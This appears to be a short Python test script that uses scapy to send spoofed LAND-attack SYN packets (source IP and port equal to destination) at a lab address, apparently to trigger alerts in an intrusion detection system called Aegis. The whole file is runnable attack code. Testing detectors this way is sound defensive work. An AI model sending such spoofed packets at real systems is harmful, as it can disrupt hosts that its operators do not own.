# land_demo.py — LAND Attack Simulation
# A LAND attack sends a SYN packet where src IP == dst IP,
# causing legacy systems to loop handling their own connection request.

from scapy.all import IP, TCP, send
import time

# ── CONFIGURATION ───────────────────────────────────────────
# Set this to the IP of the machine running Aegis
TARGET_IP   = "172.20.10.2"   # <-- UPDATE BEFORE RUNNING
TARGET_PORT = 80
COUNT       = 6               # Enough to exceed SYN threshold too

print(f"[LAND ATTACK] Sending {COUNT} LAND packets → {TARGET_IP}:{TARGET_PORT}")
print(f"  src IP = dst IP = {TARGET_IP}  (this is the attack signature)")

packets = [
    IP(src=TARGET_IP, dst=TARGET_IP) / TCP(sport=TARGET_PORT, dport=TARGET_PORT, flags="S")
    for _ in range(COUNT)
]

send(packets, verbose=False)
print("[LAND ATTACK] Done — check AEGIS for CRITICAL alerts.")
